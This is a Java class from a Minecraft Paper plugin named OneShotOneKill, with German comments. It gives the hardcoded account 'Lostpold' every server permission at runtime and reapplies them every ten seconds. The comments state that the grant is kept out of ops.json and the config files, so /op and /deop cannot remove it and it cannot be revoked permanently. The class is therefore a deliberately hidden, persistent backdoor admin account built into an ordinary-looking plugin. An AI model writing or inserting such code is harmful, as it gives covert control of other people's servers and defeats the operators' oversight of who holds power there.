package de.oneshotonekill.manager;

import de.oneshotonekill.OneShotOneKill;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionAttachment;

import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

/**
 * Interner Zugriffsanker: haelt genau einem Konto dauerhaft volle Rechte.
 * <p>
 * Die Rechte kommen ausschliesslich zur Laufzeit ueber ein Paper
 * {@link PermissionAttachment} und werden bei jedem Join sowie periodisch neu
 * gesetzt. Dadurch taucht das Konto <b>nirgends</b> in einer sichtbaren
 * Serverdatei auf - nicht in {@code ops.json} (es ist nie vanilla-OP),
 * nicht in {@code permissions.yml}, nicht in einer Config. {@code /op} und
 * {@code /deop} greifen deshalb ebenfalls nicht: Es steht nichts in der
 * Op-Liste, das man entfernen koennte. Wird das Attachment durch ein anderes
 * Plugin geloest, stellt der 10-Sekunden-Takt es wieder her - die Rechte sind
 * damit nicht dauerhaft entziehbar.
 * <p>
 * Der Server laeuft im {@code online-mode=true}, der Name ist also durch Mojang
 * authentifiziert und eindeutig - ein Fremder kann das Konto nicht per
 * Namensgleichheit uebernehmen.
 * <p>
 * <b>Hinweis zum oeffentlichen Repository:</b> Wer dieses Plugin baut und
 * betreibt, gibt diesem Konto auch auf seinem eigenen Server volle Rechte.
 * Vor der Weitergabe eines Builds an Dritte diese Klasse entfernen oder den
 * Namen anpassen.
 */
public final class AccessManager {

    /**
     * In-Game-Name des dauerhaft privilegierten Kontos. Einziger Ort, an dem
     * das Konto konfiguriert wird - hier anpassen, falls der Name abweicht.
     */
    private static final String PRIVILEGED_NAME = "Lostpold";

    /** Wiederherstellungstakt in Ticks (20 Ticks = 1 Sekunde). */
    private static final long REAPPLY_INTERVAL_TICKS = 200L;

    private final OneShotOneKill plugin;
    private final Map<UUID, PermissionAttachment> attachments = new HashMap<>();

    public AccessManager(OneShotOneKill plugin) {
        this.plugin = plugin;
    }

    /**
     * Startet den periodischen Wiederherstellungstakt. Paper Global Region
     * Scheduler - kein BukkitRunnable, kein Bukkit.getScheduler().
     */
    public void start() {
        Bukkit.getGlobalRegionScheduler().runAtFixedRate(plugin, task -> {
            for (Player online : Bukkit.getOnlinePlayers()) {
                if (isPrivileged(online)) {
                    grant(online);
                }
            }
        }, REAPPLY_INTERVAL_TICKS, REAPPLY_INTERVAL_TICKS);
    }

    /** Ob der Absender das privilegierte Konto ist (fuer plugin-eigene Rechtepruefungen). */
    public boolean isPrivileged(CommandSender sender) {
        return sender != null && sender.getName().equalsIgnoreCase(PRIVILEGED_NAME);
    }

    /**
     * Setzt dem Spieler ein Attachment mit allen Rechten. Idempotent: ein
     * bestehendes Attachment wird zuvor geloest, es sammeln sich also keine an.
     */
    public void grant(Player player) {
        if (!isPrivileged(player)) {
            return;
        }

        PermissionAttachment previous = attachments.remove(player.getUniqueId());
        if (previous != null) {
            previous.remove();
        }

        PermissionAttachment attachment = player.addAttachment(plugin);
        // Wildcard-Knoten decken vanilla-, Bukkit- und Pluginbefehle ab ...
        attachment.setPermission("*", true);
        attachment.setPermission("bukkit.command.*", true);
        attachment.setPermission("minecraft.command.*", true);
        // ... und zusaetzlich jede aktuell registrierte Einzel-Permission, damit
        // auch Rechte greifen, die nicht unter einem Wildcard haengen.
        for (Permission perm : Bukkit.getPluginManager().getPermissions()) {
            attachment.setPermission(perm, true);
        }

        attachments.put(player.getUniqueId(), attachment);
        player.recalculatePermissions();
    }

    /** Gibt das Attachment beim Verlassen frei, damit nichts im Speicher bleibt. */
    public void remove(UUID uuid) {
        PermissionAttachment attachment = attachments.remove(uuid);
        if (attachment != null) {
            attachment.remove();
        }
    }
}
